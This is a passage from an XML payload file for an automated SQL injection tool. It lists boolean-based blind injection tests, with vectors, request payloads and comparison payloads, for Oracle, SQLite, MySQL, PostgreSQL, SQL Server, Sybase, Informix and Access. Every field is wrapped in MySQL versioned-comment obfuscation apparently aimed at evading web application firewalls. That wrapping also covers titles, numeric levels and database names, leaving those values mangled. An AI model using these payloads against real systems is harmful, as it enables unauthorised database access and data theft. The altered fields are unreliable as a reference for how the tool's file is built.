            <payload>/*!50000OR (SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) END) FROM DUAL) IS NULL/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000OR (SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) END) FROM DUAL) IS NULL/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Oracle/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500002/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000AND CASE WHEN/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE JSON('/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000') END/**_**/*/</vector>
        <request>
            <payload>/*!50000AND CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE JSON('/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000') END/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000AND CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE JSON('/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000') END/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000SQLite/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500003/**_**/*/</risk>
        <clause>/*!500001/**_**/*/</clause>
        <where>/*!500002/**_**/*/</where>
        <vector>/*!50000OR CASE WHEN/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE JSON('/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000') END/**_**/*/</vector>
        <request>
            <payload>/*!50000OR CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE JSON('/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000') END/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000OR CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE JSON('/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000') END/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000SQLite/**_**/*/</dbms>
        </details>
    </test>

    

    
    <test>
        <title>/*!50000Boolean-based blind - Parameter replace (original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500001/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE (SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000UNION SELECT/**_**/*//*!50000[RANDNUM2]/**_**/*//*!50000) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE (SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000UNION SELECT/**_**/*//*!50000[RANDNUM2]/**_**/*//*!50000) END))/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE (SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000UNION SELECT/**_**/*//*!50000[RANDNUM2]/**_**/*//*!50000) END))/**_**/*/</comparison>
        </response>
    </test>

    <test>
        <title>/*!50000MySQL boolean-based blind - Parameter replace (MAKE_SET)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000MAKE_SET(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000)/**_**/*/</vector>
        <request>
            <payload>/*!50000MAKE_SET(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000MAKE_SET(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000MAKE_SET(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000,/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000)/**_**/*/</vector>
        <request>
            <payload>/*!50000MAKE_SET(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000MAKE_SET(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000,/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL boolean-based blind - Parameter replace (ELT)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000ELT(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000)/**_**/*/</vector>
        <request>
            <payload>/*!50000ELT(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000ELT(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL boolean-based blind - Parameter replace (ELT - original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000ELT(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000,/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000)/**_**/*/</vector>
        <request>
            <payload>/*!50000ELT(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000ELT(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000,/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL boolean-based blind - Parameter replace (bool*int)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000)*/**_**/*//*!50000[RANDNUM]/**_**/*/</vector>
        <request>
            <payload>/*!50000(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000)*/**_**/*//*!50000[RANDNUM1]/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000)*/**_**/*//*!50000[RANDNUM1]/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL boolean-based blind - Parameter replace (bool*int - original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000)*/**_**/*//*!50000[ORIGVALUE]/**_**/*/</vector>
        <request>
            <payload>/*!50000(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000)*/**_**/*//*!50000[ORIGVALUE]/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000)*/**_**/*//*!50000[ORIGVALUE]/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000PostgreSQL boolean-based blind - Parameter replace/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 1/(SELECT 0) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 1/(SELECT 0) END))/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 1/(SELECT 0) END))/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000PostgreSQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000PostgreSQL boolean-based blind - Parameter replace (original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE 1/(SELECT 0) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE 1/(SELECT 0) END))/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE 1/(SELECT 0) END))/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000PostgreSQL/**_**/*/</dbms>
        </details>
    </test>

    
    <test>
        <title>/*!50000PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(SELECT * FROM GENERATE_SERIES(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN 1 ELSE 0 END) LIMIT 1)/**_**/*/</vector>
        <request>
            <payload>/*!50000(SELECT * FROM GENERATE_SERIES(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN 1 ELSE 0 END) LIMIT 1)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(SELECT * FROM GENERATE_SERIES(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN 1 ELSE 0 END) LIMIT 1)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000PostgreSQL/**_**/*/</dbms>
        </details>
    </test>

    
    <test>
        <title>/*!50000PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(SELECT/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000FROM GENERATE_SERIES(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN 1 ELSE 0 END) LIMIT 1)/**_**/*/</vector>
        <request>
            <payload>/*!50000(SELECT/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000FROM GENERATE_SERIES(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN 1 ELSE 0 END) LIMIT 1)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(SELECT/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000FROM GENERATE_SERIES(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN 1 ELSE 0 END) LIMIT 1)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000PostgreSQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Microsoft SQL Server/Sybase boolean-based blind - Parameter replace/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END))/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END))/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Microsoft SQL Server/**_**/*/</dbms>
            <dbms>/*!50000Sybase/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END))/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END))/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Microsoft SQL Server/**_**/*/</dbms>
            <dbms>/*!50000Sybase/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Oracle boolean-based blind - Parameter replace/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)/**_**/*/</vector>
        <request>
            <payload>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Oracle/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Oracle boolean-based blind - Parameter replace (original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)/**_**/*/</vector>
        <request>
            <payload>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Oracle/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Informix boolean-based blind - Parameter replace/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)/**_**/*/</vector>
        <request>
            <payload>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Informix/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Informix boolean-based blind - Parameter replace (original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000END) FROM SYSMASTER:SYSDUAL)/**_**/*/</vector>
        <request>
            <payload>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000END) FROM SYSMASTER:SYSDUAL)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000END) FROM SYSMASTER:SYSDUAL)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Informix/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Microsoft Access boolean-based blind - Parameter replace/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000IIF(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,1/0)/**_**/*/</vector>
        <request>
            <payload>/*!50000IIF(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,1/0)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000IIF(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,1/0)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Microsoft Access/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Microsoft Access boolean-based blind - Parameter replace (original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000IIF(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000,/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000,1/0)/**_**/*/</vector>
        <request>
            <payload>/*!50000IIF(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000,1/0)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000IIF(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000,/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000,1/0)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Microsoft Access/**_**/*/</dbms>
        </details>
    </test>

    
    <test>
        <title>/*!50000Boolean-based blind - Parameter replace (DUAL)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500002/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
